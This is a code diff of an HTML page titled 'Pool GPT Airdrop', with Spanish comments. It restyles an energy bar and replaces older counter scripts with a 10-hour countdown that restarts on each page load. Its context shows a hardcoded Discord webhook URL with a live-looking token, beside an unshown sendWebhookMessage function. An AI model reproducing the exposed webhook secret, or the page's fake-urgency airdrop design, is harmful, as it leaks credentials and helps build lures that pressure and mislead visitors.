@@ -317,7 +317,7 @@
   flex-direction: column;
   justify-content: center;
   align-items: center;
-  width: 200px;
+  width: 100%;
   height: 50px;
   border: 5px solid #ccc;
   border-radius: 25px;
@@ -326,6 +326,7 @@
 
 .energy-bar {
   height: 100%;
+  width: 78%;
   background-color: #ff9900;
   border-radius: 25px;
   position: absolute;
@@ -343,89 +344,51 @@
   z-index: 1;
 }
 
-	#energy-bar {
-  width: 100%;
-  height: 20px;
-  background-color: #eee;
-  position: relative;
+.energy-bar.red {
+  background-color: #ff0000;
 }
 
-#energy {
-  width: 78%;
-  height: 100%;
-  background-color: #6ab04c;
-  position: absolute;
-  top: 0;
-  left: 0;
+.energy-bar.orange {
+  background-color: #ff9900;
 }
 
-#energy-bar p {
-  position: absolute;
-  top: 25px;
-  left: 0;
-  width: 100%;
-  text-align: center;
+.energy-bar.green {
+  background-color: #00cc00;
 }
+
 
 </style>
 
 <script>
-    const counter = document.querySelector('.counter');
-    let count = 0.001;
-    const increment = 0.001;
-    const target = 500;
+const energyBar = document.getElementById("energy");
+const maxTime = 36000; //10 horas = 36000 segundos
+let remainingTime = maxTime;
 
-    function updateCounter() {
-        count += increment;
-        counter.textContent = count.toFixed(2) + '%';
-
-        if (count < target) {
-            setTimeout(updateCounter, 50);
-        } else {
-            counter.classList.add('count');
-        }
-    }
-
-    setTimeout(updateCounter, 3000);
-</script>
-	  <script>
-	  // Obtenemos el elemento del contador
-var timer = document.getElementById('timer');
-
-// Obtenemos el elemento de la barra de energía
-var energy = document.getElementById('energy');
-
-// Establecemos la hora límite para el contador
-var deadline = new Date();
-deadline.setHours(deadline.getHours() + 10);
-
-// Actualizamos el contador y la barra de energía cada segundo
-var interval = setInterval(function() {
-  // Calculamos el tiempo restante
-  var now = new Date();
-  var remaining = deadline.getTime() - now.getTime();
-  var seconds = Math.floor(remaining / 1000);
-
-  // Actualizamos el contenido del contador
-  timer.innerHTML = formatTime(seconds);
-
-  // Calculamos el porcentaje de la barra de energía que debe mostrarse
-  var percentage = (remaining / (10 * 60 * 60 * 1000)) * 78;
-  energy.style.width = percentage + '%';
-
-  // Detenemos el intervalo cuando el tiempo restante llega a cero
-  if (seconds <= 0) {
-    clearInterval(interval);
-    timer.innerHTML = "0:00";
+function updateCounter() {
+  const hours = Math.floor(remainingTime / 3600);
+  const minutes = Math.floor((remainingTime - (hours * 3600)) / 60);
+  const seconds = remainingTime - (hours * 3600) - (minutes * 60);
+  const timeString = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
+  energyBar.style.width = `${(remainingTime / maxTime) * 100}%`;
+  energyBar.classList.remove("orange", "red", "green");
+  if (remainingTime > 21600) {
+    energyBar.classList.add("green");
+  } else if (remainingTime > 10800) {
+    energyBar.classList.add("orange");
+  } else {
+    energyBar.classList.add("red");
   }
-}, 1000);
-
-// Función para formatear el tiempo restante en formato mm:ss
-function formatTime(seconds) {
-  var minutes = Math.floor(seconds / 60);
-  var remainingSeconds = seconds % 60;
-  return minutes + ":" + (remainingSeconds < 10 ? "0" : "") + remainingSeconds;
+  document.getElementById("timer").innerHTML = timeString;
+  remainingTime--;
+  if (remainingTime < 0) {
+    clearInterval(counter);
+    document.getElementById("timer").innerHTML = "00:00:00";
+  }
 }
+
+updateCounter();
+const counter = setInterval(updateCounter, 1000);
+
 </script>
 
 
@@ -524,16 +487,17 @@ function sendWebhookMessage(webhookUrl, message) {
       const webhookUrl = "https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-";
 
     </script>
-	<div class="countdown-wrapper">
-  <h2>Time out</h2>
-  <div class="countdown">
-    <span id="timer"></span>
-  </div>
-  <div class="energy-wrapper">
-    <div class="energy-bar" id="energy"></div>
-    <span class="energy-text">Pool GPT Airdrop</span>
-  </div>
+
+<div class="energy-wrapper">
+  <div class="energy-bar" id="energy"></div>
+  <span class="energy-text">Pool GPT Airdrop</span>
 </div>
+<div class="counter-wrapper">
+  <span class="counter-title">Tiempo restante:</span>
+  <span class="counter" id="timer"></span>
+</div>
+
+
 
   </body>
 </html>
